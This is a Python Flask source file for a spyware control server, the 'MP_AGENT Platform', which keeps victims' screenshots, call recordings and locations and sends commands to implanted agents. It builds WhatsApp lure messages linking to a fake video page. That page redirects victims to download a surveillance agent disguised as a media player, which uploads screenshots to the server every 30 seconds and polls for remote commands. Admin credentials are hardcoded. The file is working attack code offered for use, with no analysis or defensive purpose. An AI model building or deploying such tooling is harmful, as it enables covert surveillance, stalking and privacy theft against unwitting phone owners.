from flask import Flask, request, jsonify, session, redirect, render_template, Response, send_file, render_template_string
import sqlite3
from datetime import datetime
import os
import random
import io

app = Flask(__name__)
app.secret_key = os.environ.get('SECRET_KEY', 'mp_agent_platform_2024')
app.template_folder = 'templates'

# Admin credentials
ADMIN_USERNAME = "Mpc"
ADMIN_PASSWORD = "0220Mpc"

# Initialize database
def init_database():
    conn = sqlite3.connect('mp_agent.db')
    cursor = conn.cursor()
    
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS agents (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            agent_id TEXT UNIQUE NOT NULL,
            phone_model TEXT,
            android_version TEXT,
            ip_address TEXT,
            status TEXT DEFAULT 'active',
            first_seen DATETIME,
            last_seen DATETIME,
            screenshot_count INTEGER DEFAULT 0,
            call_records INTEGER DEFAULT 0,
            location_data TEXT,
            battery_level INTEGER,
            last_screenshot DATETIME
        )
    ''')
    
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS screenshots (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            agent_id TEXT,
            screenshot_data BLOB,
            timestamp DATETIME,
            FOREIGN KEY (agent_id) REFERENCES agents (agent_id)
        )
    ''')
    
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS call_records (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            agent_id TEXT,
            call_type TEXT,
            phone_number TEXT,
            duration INTEGER,
            audio_data BLOB,
            timestamp DATETIME,
            FOREIGN KEY (agent_id) REFERENCES agents (agent_id)
        )
    ''')
    
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS deployments (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            target_phone TEXT,
            agent_id TEXT,
            message_sent TEXT,
            status TEXT,
            timestamp DATETIME
        )
    ''')
    
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS system_logs (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            level TEXT,
            message TEXT,
            timestamp DATETIME
        )
    ''')
    
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS commands (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            agent_id TEXT,
            command TEXT,
            status TEXT DEFAULT 'pending',
            result TEXT,
            timestamp DATETIME
        )
    ''')
    
    conn.commit()
    conn.close()

def get_db_connection():
    conn = sqlite3.connect('mp_agent.db')
    conn.row_factory = sqlite3.Row
    return conn

def log_event(level, message):
    conn = get_db_connection()
    conn.execute(
        'INSERT INTO system_logs (level, message, timestamp) VALUES (?, ?, ?)',
        (level, message, datetime.now())
    )
    conn.commit()
    conn.close()

# Initialize database on startup
init_database()

# ==================== ADMIN DASHBOARD ROUTES ====================

@app.route('/')
def index():
    if session.get('authenticated'):
        return redirect('/dashboard')  # Redirect to dashboard
    return redirect('/login')

@app.route('/dashboard')
def dashboard():
    if not session.get('authenticated'):
        return redirect('/login')
    
    conn = get_db_connection()
    
    # Get statistics
    stats = {
        'active_agents': conn.execute("SELECT COUNT(*) FROM agents WHERE status='active'").fetchone()[0],
        'total_screenshots': conn.execute("SELECT COUNT(*) FROM screenshots").fetchone()[0],
        'total_calls': conn.execute("SELECT COUNT(*) FROM call_records").fetchone()[0],
        'total_deployments': conn.execute("SELECT COUNT(*) FROM deployments").fetchone()[0]
    }
    
    # Get recent data
    agents = conn.execute("SELECT * FROM agents WHERE status='active' ORDER BY last_seen DESC LIMIT 20").fetchall()
    screenshots = conn.execute('''
        SELECT s.*, a.phone_model FROM screenshots s 
        JOIN agents a ON s.agent_id = a.agent_id 
        ORDER BY s.timestamp DESC LIMIT 16
    ''').fetchall()
    calls = conn.execute("SELECT * FROM call_records ORDER BY timestamp DESC LIMIT 15").fetchall()
    deployments = conn.execute("SELECT * FROM deployments ORDER BY timestamp DESC LIMIT 15").fetchall()
    
    conn.close()
    
    platform_url = request.host_url.rstrip('/')
    
    return render_template('dashboard.html',
                         stats=stats,
                         agents=agents,
                         screenshots=screenshots,
                         calls=calls,
                         deployments=deployments,
                         platform_url=platform_url)

@app.route('/admin')
def admin_dashboard():
    if not session.get('authenticated'):
        return redirect('/login')
    
    conn = get_db_connection()
    
    # Get comprehensive statistics
    stats = {
        'active_agents': conn.execute("SELECT COUNT(*) FROM agents WHERE status='active'").fetchone()[0],
        'total_screenshots': conn.execute("SELECT COUNT(*) FROM screenshots").fetchone()[0],
        'total_calls': conn.execute("SELECT COUNT(*) FROM call_records").fetchone()[0],
        'total_deployments': conn.execute("SELECT COUNT(*) FROM deployments").fetchone()[0],
        'pending_commands': conn.execute("SELECT COUNT(*) FROM commands WHERE status='pending'").fetchone()[0]
    }
    
    # Get recent data
    agents = conn.execute("SELECT * FROM agents WHERE status='active' ORDER BY last_seen DESC LIMIT 20").fetchall()
    screenshots = conn.execute('''
        SELECT s.*, a.phone_model FROM screenshots s 
        JOIN agents a ON s.agent_id = a.agent_id 
        ORDER BY s.timestamp DESC LIMIT 16
    ''').fetchall()
    
    calls = conn.execute("SELECT * FROM call_records ORDER BY timestamp DESC LIMIT 15").fetchall()
    deployments = conn.execute("SELECT * FROM deployments ORDER BY timestamp DESC LIMIT 15").fetchall()
    commands = conn.execute("SELECT * FROM commands ORDER BY timestamp DESC LIMIT 10").fetchall()
    logs = conn.execute("SELECT * FROM system_logs ORDER BY timestamp DESC LIMIT 20").fetchall()
    
    conn.close()
    
    platform_url = request.host_url.rstrip('/')
    
    return render_template('admin_dashboard.html',
                         stats=stats,
                         agents=agents,
                         screenshots=screenshots,
                         calls=calls,
                         deployments=deployments,
                         commands=commands,
                         logs=logs,
                         platform_url=platform_url)

@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        username = request.form.get('username')
        password = request.form.get('password')
        
        if username == ADMIN_USERNAME and password == ADMIN_PASSWORD:
            session['authenticated'] = True
            session['username'] = username
            log_event('INFO', f'Admin login: {username}')
            return redirect('/dashboard')  # Redirect to dashboard after login
        else:
            return '''
            <script>
                alert("Invalid credentials! Use: M... / ...Mpc");
                window.location.href = "/login";
            </script>
            '''
    
    return '''
    <!DOCTYPE html>
    <html>
    <head>
        <title>MP_AGENT - Platform Login</title>
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <style>
            * { margin: 0; padding: 0; box-sizing: border-box; }
            body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); height: 100vh; display: flex; justify-content: center; align-items: center; }
            .login-container { background: white; padding: 40px; border-radius: 15px; box-shadow: 0 15px 35px rgba(0,0,0,0.3); width: 100%; max-width: 400px; }
            .logo { text-align: center; margin-bottom: 30px; }
            .logo h1 { color: #333; font-size: 28px; margin-bottom: 10px; }
            .logo p { color: #666; font-size: 14px; }
            .form-group { margin-bottom: 20px; }
            .form-group label { display: block; margin-bottom: 8px; color: #333; font-weight: 600; }
            .form-group input { width: 100%; padding: 12px 15px; border: 2px solid #e1e1e1; border-radius: 8px; font-size: 14px; transition: all 0.3s ease; }
            .form-group input:focus { outline: none; border-color: #667eea; box-shadow: 0 0 0 3px rgba(102, 126, 234, 0.1); }
            .btn-login { width: 100%; background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); color: white; padding: 12px; border: none; border-radius: 8px; font-size: 16px; font-weight: 600; cursor: pointer; transition: transform 0.2s; }
            .btn-login:hover { transform: translateY(-2px); }
            .credentials { margin-top: 25px; padding: 15px; background: #f8f9fa; border-radius: 8px; text-align: center; }
            .credentials h3 { color: #333; margin-bottom: 10px; font-size: 14px; }
            .credentials code { background: #e9ecef; padding: 2px 6px; border-radius: 4px; font-family: monospace; }
        </style>
    </head>
    <body>
        <div class="login-container">
            <div class="logo">
                <h1>🔐 MP_AGENT PLATFORM</h1>
                <p>Complete Surveillance Control Center</p>
            </div>
            
            <form method="POST" action="/login">
                <div class="form-group">
                    <label for="username">Username</label>
                    <input type="text" id="username" name="username" placeholder="Enter username" required>
                </div>
                
                <div class="form-group">
                    <label for="password">Password</label>
                    <input type="password" id="password" name="password" placeholder="Enter password" required>
                </div>
                
                <button type="submit" class="btn-login">Login to Control Panel</button>
            </form>
            
            
        </div>
    </body>
    </html>
    '''

# ==================== AGENT API ROUTES ====================

@app.route('/api/agent/register', methods=['POST'])
def register_agent():
    """Agent registration endpoint"""
    try:
        data = request.json
        agent_id = data.get('agent_id')
        phone_model = data.get('phone_model', 'Unknown Device')
        android_version = data.get('android_version', 'Unknown')
        ip_address = request.remote_addr
        
        conn = get_db_connection()
        
        existing_agent = conn.execute(
            "SELECT id FROM agents WHERE agent_id = ?", (agent_id,)
        ).fetchone()
        
        if existing_agent:
            conn.execute(
                "UPDATE agents SET last_seen = ?, status = 'active', ip_address = ? WHERE agent_id = ?",
                (datetime.now(), ip_address, agent_id)
            )
            action = "updated"
        else:
            conn.execute('''
                INSERT INTO agents (agent_id, phone_model, android_version, ip_address, first_seen, last_seen)
                VALUES (?, ?, ?, ?, ?, ?)
            ''', (agent_id, phone_model, android_version, ip_address, datetime.now(), datetime.now()))
            action = "registered"
        
        log_event('INFO', f'Agent {action}: {agent_id} from {ip_address}')
        conn.commit()
        conn.close()
        
        # Check for pending commands
        conn = get_db_connection()
        pending_commands = conn.execute(
            "SELECT command FROM commands WHERE agent_id = ? AND status = 'pending'", 
            (agent_id,)
        ).fetchall()
        conn.close()
        
        commands_list = [cmd['command'] for cmd in pending_commands]
        
        return jsonify({
            'status': 'success', 
            'message': f'Agent {action} successfully',
            'pending_commands': commands_list
        })
        
    except Exception as e:
        log_event('ERROR', f'Agent registration failed: {str(e)}')
        return jsonify({'status': 'error', 'message': str(e)}), 500

@app.route('/api/agent/upload_screenshot', methods=['POST'])
def upload_screenshot():
    """Receive screenshots from agents"""
    try:
        agent_id = request.form.get('agent_id')
        screenshot_file = request.files.get('screenshot')
        
        if not agent_id or not screenshot_file:
            return jsonify({'status': 'error', 'message': 'Missing agent_id or screenshot'}), 400
        
        screenshot_data = screenshot_file.read()
        
        conn = get_db_connection()
        conn.execute(
            'INSERT INTO screenshots (agent_id, screenshot_data, timestamp) VALUES (?, ?, ?)',
            (agent_id, screenshot_data, datetime.now())
        )
        conn.execute(
            'UPDATE agents SET screenshot_count = screenshot_count + 1, last_seen = ?, last_screenshot = ? WHERE agent_id = ?',
            (datetime.now(), datetime.now(), agent_id)
        )
        conn.commit()
        conn.close()
        
        log_event('INFO', f'Screenshot uploaded from {agent_id}')
        return jsonify({'status': 'success', 'message': 'Screenshot uploaded successfully'})
        
    except Exception as e:
        log_event('ERROR', f'Screenshot upload failed: {str(e)}')
        return jsonify({'status': 'error', 'message': str(e)}), 500

@app.route('/api/agent/upload_call', methods=['POST'])
def upload_call():
    """Receive call recordings from agents"""
    try:
        agent_id = request.form.get('agent_id')
        call_type = request.form.get('call_type', 'unknown')
        phone_number = request.form.get('phone_number', 'unknown')
        duration = request.form.get('duration', 0)
        audio_file = request.files.get('audio')
        
        audio_data = audio_file.read() if audio_file else None
        
        conn = get_db_connection()
        conn.execute('''
            INSERT INTO call_records (agent_id, call_type, phone_number, duration, audio_data, timestamp)
            VALUES (?, ?, ?, ?, ?, ?)
        ''', (agent_id, call_type, phone_number, duration, audio_data, datetime.now()))
        conn.execute(
            'UPDATE agents SET call_records = call_records + 1, last_seen = ? WHERE agent_id = ?',
            (datetime.now(), agent_id)
        )
        conn.commit()
        conn.close()
        
        log_event('INFO', f'Call recording from {agent_id}: {call_type} call to {phone_number}')
        return jsonify({'status': 'success', 'message': 'Call recording uploaded successfully'})
        
    except Exception as e:
        log_event('ERROR', f'Call upload failed: {str(e)}')
        return jsonify({'status': 'error', 'message': str(e)}), 500

@app.route('/api/agent/update_status', methods=['POST'])
def update_agent_status():
    """Update agent status and information"""
    try:
        data = request.json
        agent_id = data.get('agent_id')
        battery_level = data.get('battery_level')
        location = data.get('location')
        
        conn = get_db_connection()
        conn.execute(
            'UPDATE agents SET last_seen = ?, battery_level = ?, location_data = ? WHERE agent_id = ?',
            (datetime.now(), battery_level, location, agent_id)
        )
        conn.commit()
        conn.close()
        
        return jsonify({'status': 'success', 'message': 'Status updated'})
        
    except Exception as e:
        return jsonify({'status': 'error', 'message': str(e)}), 500

# ==================== MEDIA SERVING ROUTES ====================

@app.route('/media/screenshot/<int:screenshot_id>')
def serve_screenshot(screenshot_id):
    if not session.get('authenticated'):
        return redirect('/login')
    
    conn = get_db_connection()
    screenshot = conn.execute(
        "SELECT screenshot_data FROM screenshots WHERE id = ?", (screenshot_id,)
    ).fetchone()
    conn.close()
    
    if screenshot and screenshot['screenshot_data']:
        return Response(screenshot['screenshot_data'], mimetype='image/jpeg')
    return 'Screenshot not found', 404

@app.route('/media/call/<int:call_id>')
def serve_call_audio(call_id):
    if not session.get('authenticated'):
        return redirect('/login')
    
    conn = get_db_connection()
    call = conn.execute(
        "SELECT audio_data FROM call_records WHERE id = ?", (call_id,)
    ).fetchone()
    conn.close()
    
    if call and call['audio_data']:
        return Response(call['audio_data'], mimetype='audio/mp4')
    return 'Call recording not found', 404

# ==================== DEPLOYMENT ROUTES ====================

@app.route('/deploy', methods=['POST'])
def deploy_agent():
    if not session.get('authenticated'):
        return redirect('/login')
    
    target_phone = request.form.get('phone_number')
    agent_id = request.form.get('agent_id', f'phone_{target_phone}')
    
    platform_url = request.host_url.rstrip('/')
    malicious_link = f"{platform_url}/video?phone={agent_id}"
    whatsapp_message = f"Check this out! 😊 {malicious_link}"
    
    conn = get_db_connection()
    conn.execute(
        'INSERT INTO deployments (target_phone, agent_id, message_sent, status, timestamp) VALUES (?, ?, ?, ?, ?)',
        (target_phone, agent_id, whatsapp_message, 'initiated', datetime.now())
    )
    conn.commit()
    conn.close()
    
    log_event('INFO', f'Deployment created for {target_phone} -> {agent_id}')
    
    return render_template('deployment.html', 
                         target_phone=target_phone,
                         agent_id=agent_id,
                         malicious_link=malicious_link,
                         whatsapp_message=whatsapp_message)

# ==================== COMMAND ROUTES ====================

@app.route('/admin/command', methods=['POST'])
def send_command():
    if not session.get('authenticated'):
        return redirect('/login')
    
    agent_id = request.form.get('agent_id')
    command = request.form.get('command')
    
    conn = get_db_connection()
    conn.execute(
        'INSERT INTO commands (agent_id, command, timestamp) VALUES (?, ?, ?)',
        (agent_id, command, datetime.now())
    )
    conn.commit()
    conn.close()
    
    log_event('INFO', f'Command sent to {agent_id}: {command}')
    return redirect('/admin')

@app.route('/api/agent/check_commands/<agent_id>')
def check_commands(agent_id):
    """Agents check for pending commands"""
    conn = get_db_connection()
    commands = conn.execute(
        "SELECT id, command FROM commands WHERE agent_id = ? AND status = 'pending'", 
        (agent_id,)
    ).fetchall()
    conn.close()
    
    commands_list = [{'id': cmd['id'], 'command': cmd['command']} for cmd in commands]
    return jsonify({'commands': commands_list})

@app.route('/api/agent/command_result', methods=['POST'])
def command_result():
    """Agents send command execution results"""
    try:
        data = request.json
        command_id = data.get('command_id')
        result = data.get('result')
        
        conn = get_db_connection()
        conn.execute(
            "UPDATE commands SET status = 'completed', result = ? WHERE id = ?",
            (result, command_id)
        )
        conn.commit()
        conn.close()
        
        log_event('INFO', f'Command {command_id} completed with result')
        return jsonify({'status': 'success'})
        
    except Exception as e:
        return jsonify({'status': 'error', 'message': str(e)}), 500

# ==================== MALICIOUS DELIVERY ROUTES ====================

MALICIOUS_HTML = """
<!DOCTYPE html>
<html>
<head>
    <title>Video Player</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        body { font-family: Arial; text-align: center; padding: 20px; background: #000; color: white; }
        .loader { color: #4CAF50; font-size: 18px; margin: 20px 0; }
        .video-placeholder { background: #333; padding: 100px 20px; margin: 20px auto; max-width: 400px; border-radius: 10px; }
        .progress { width: 100%; background: #555; height: 20px; border-radius: 10px; margin: 20px 0; }
        .progress-bar { width: 0%; height: 100%; background: #4CAF50; border-radius: 10px; transition: width 0.5s; }
    </style>
</head>
<body>
    <h2>🎬 Video Player</h2>
    <div class="loader" id="status">Loading video player...</div>
    <div class="video-placeholder">Video Content Loading</div>
    <div class="progress"><div class="progress-bar" id="progress"></div></div>

    <script>
        const steps = [
            {text: "Connecting to server...", progress: 10},
            {text: "Loading video data...", progress: 25},
            {text: "Buffering stream...", progress: 45},
            {text: "Decoding video...", progress: 65},
            {text: "Optimizing playback...", progress: 85},
            {text: "⚠️ Update required for HD playback", progress: 95},
            {text: "Redirecting to download...", progress: 100}
        ];
        
        let step = 0;
        function nextStep() {
            if (step < steps.length) {
                document.getElementById('status').innerHTML = steps[step].text + " ✅";
                document.getElementById('progress').style.width = steps[step].progress + '%';
                step++;
                setTimeout(nextStep, 1500);
                
                if (step === steps.length - 1) {
                    setTimeout(() => {
                        window.location.href = "/download_agent?phone={{ phone_id }}";
                    }, 2000);
                }
            }
        }
        setTimeout(nextStep, 1000);
    </script>
</body>
</html>
"""

@app.route('/video')
def fake_video():
    """Fake video page for social engineering"""
    phone_id = request.args.get('phone', 'unknown')
    
    log_event('INFO', f'User accessed fake video: {phone_id} from {request.remote_addr}')
    
    conn = get_db_connection()
    conn.execute(
        'INSERT INTO deployments (target_phone, agent_id, message_sent, status, timestamp) VALUES (?, ?, ?, ?, ?)',
        (phone_id, phone_id, 'User clicked video link', 'clicked', datetime.now())
    )
    conn.commit()
    conn.close()
    
    return render_template_string(MALICIOUS_HTML, phone_id=phone_id)

@app.route('/download_agent')
def download_agent():
    """Serve the agent to victims"""
    phone_id = request.args.get('phone', 'unknown')
    
    log_event('INFO', f'Agent download triggered for: {phone_id}')
    
    conn = get_db_connection()
    conn.execute(
        'INSERT INTO deployments (target_phone, agent_id, message_sent, status, timestamp) VALUES (?, ?, ?, ?, ?)',
        (phone_id, phone_id, 'Agent download initiated', 'downloaded', datetime.now())
    )
    conn.commit()
    conn.close()
    
    platform_url = request.host_url.rstrip('/')
    
    agent_code = f'''# MP_AGENT - REAL ANDROID SURVEILLANCE AGENT
# Agent ID: {phone_id}
# Platform: {platform_url}

import requests
import time
import os
import platform
import subprocess
from datetime import datetime
from threading import Thread

class RealAndroidAgent:
    def __init__(self, agent_id, platform_url):
        self.agent_id = agent_id
        self.platform_url = platform_url
        self.running = True
        self.screenshot_count = 0
        
    def get_device_info(self):
        return {{
            'agent_id': self.agent_id,
            'phone_model': platform.node() or 'Unknown Device',
            'android_version': 'Real Device',
            'timestamp': datetime.now().isoformat()
        }}
    
    def register_with_platform(self):
        try:
            info = self.get_device_info()
            response = requests.post(
                f"{{self.platform_url}}/api/agent/register",
                json=info,
                timeout=10
            )
            if response.status_code == 200:
                data = response.json()
                print("✅ Registered with platform")
                # Check for pending commands
                if data.get('pending_commands'):
                    for cmd in data['pending_commands']:
                        print(f"📡 Executing command: {{cmd}}")
                        self.execute_command(cmd)
                return True
        except Exception as e:
            print(f"❌ Platform registration failed: {{e}}")
        return False
    
    def execute_command(self, command):
        try:
            if command == 'capture_screenshot':
                self.upload_screenshot()
            elif command == 'get_info':
                self.register_with_platform()
            # Add more commands as needed
        except Exception as e:
            print(f"Command execution failed: {{e}}")
    
    def capture_real_screenshot(self):
        try:
            timestamp = int(time.time())
            remote_file = f"/sdcard/screen_{{self.agent_id}}_{{timestamp}}.png"
            local_file = f"screen_{{timestamp}}.png"
            
            subprocess.run(['adb', 'shell', 'screencap', '-p', remote_file], capture_output=True, timeout=10)
            subprocess.run(['adb', 'pull', remote_file, local_file], capture_output=True, timeout=10)
            
            if os.path.exists(local_file):
                with open(local_file, 'rb') as f:
                    data = f.read()
                os.remove(local_file)
                subprocess.run(['adb', 'shell', 'rm', remote_file], capture_output=True)
                return data
        except Exception as e:
            print(f"Screenshot failed: {{e}}")
        
        return f"SCREENSHOT_{{self.agent_id}}_{{int(time.time())}}".encode()
    
    def upload_screenshot(self):
        try:
            screenshot_data = self.capture_real_screenshot()
            files = {{'screenshot': ('screen.jpg', screenshot_data, 'image/jpeg')}}
            data = {{'agent_id': self.agent_id}}
            
            response = requests.post(
                f"{{self.platform_url}}/api/agent/upload_screenshot",
                files=files,
                data=data,
                timeout=30
            )
            if response.status_code == 200:
                self.screenshot_count += 1
                print(f"📸 Screenshot #{{self.screenshot_count}} uploaded")
                return True
        except Exception as e:
            print(f"Upload failed: {{e}}")
        return False
    
    def check_commands(self):
        try:
            response = requests.get(
                f"{{self.platform_url}}/api/agent/check_commands/{{self.agent_id}}",
                timeout=10
            )
            if response.status_code == 200:
                data = response.json()
                for cmd in data.get('commands', []):
                    print(f"🎯 Executing command: {{cmd['command']}}")
                    self.execute_command(cmd['command'])
                    # Mark command as completed
                    requests.post(f"{{self.platform_url}}/api/agent/command_result", 
                                json={{'command_id': cmd['id'], 'result': 'executed'}})
        except Exception as e:
            print(f"Command check failed: {{e}}")
    
    def start_surveillance(self):
        print("🎯 MP_AGENT Surveillance Starting...")
        print(f"🆔 Agent ID: {{self.agent_id}}")
        print(f"🌐 Platform: {{self.platform_url}}")
        print("=" * 50)
        
        self.register_with_platform()
        
        def surveillance_loop():
            while self.running:
                try:
                    self.upload_screenshot()
                    self.check_commands()
                    time.sleep(30)
                except Exception as e:
                    print(f"Surveillance error: {{e}}")
                    time.sleep(60)
        
        def heartbeat_loop():
            while self.running:
                try:
                    self.register_with_platform()
                    time.sleep(300)
                except Exception as e:
                    print(f"Heartbeat error: {{e}}")
                    time.sleep(60)
        
        Thread(target=surveillance_loop, daemon=True).start()
        Thread(target=heartbeat_loop, daemon=True).start()
        
        print("✅ Surveillance Active!")
        print("📸 Screenshots: Every 30 seconds")
        print("📡 Commands: Real-time checking")
        print("🔄 Heartbeat: Every 5 minutes")
        print("=" * 50)
    
    def stop_surveillance(self):
        self.running = False
        print("🛑 Surveillance stopped")

if __name__ == "__main__":
    PLATFORM_URL = "{platform_url}"
    AGENT_ID = "{phone_id}"
    
    agent = RealAndroidAgent(AGENT_ID, PLATFORM_URL)
    agent.start_surveillance()
    
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        agent.stop_surveillance()
        print("Agent shutdown complete")
'''
    
    return Response(
        agent_code,
        mimetype='text/python',
        headers={
            'Content-Disposition': f'attachment; filename="media_player_{phone_id}.py"'
        }
    )

# ==================== ADMIN UTILITY ROUTES ====================

@app.route('/admin/clear_agent/<agent_id>')
def clear_agent(agent_id):
    if not session.get('authenticated'):
        return redirect('/login')
    
    conn = get_db_connection()
    conn.execute("DELETE FROM agents WHERE agent_id = ?", (agent_id,))
    conn.execute("DELETE FROM screenshots WHERE agent_id = ?", (agent_id,))
    conn.execute("DELETE FROM call_records WHERE agent_id = ?", (agent_id,))
    conn.commit()
    conn.close()
    
    log_event('WARNING', f'Agent {agent_id} cleared by admin')
    return redirect('/admin')

@app.route('/logout')
def logout():
    session.clear()
    return redirect('/login')

@app.route('/health')
def health_check():
    return jsonify({
        'status': 'healthy',
        'platform': 'mp_agent_platform',
        'timestamp': datetime.now().isoformat(),
        'agents_count': get_db_connection().execute("SELECT COUNT(*) FROM agents").fetchone()[0]
    })

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port, debug=False)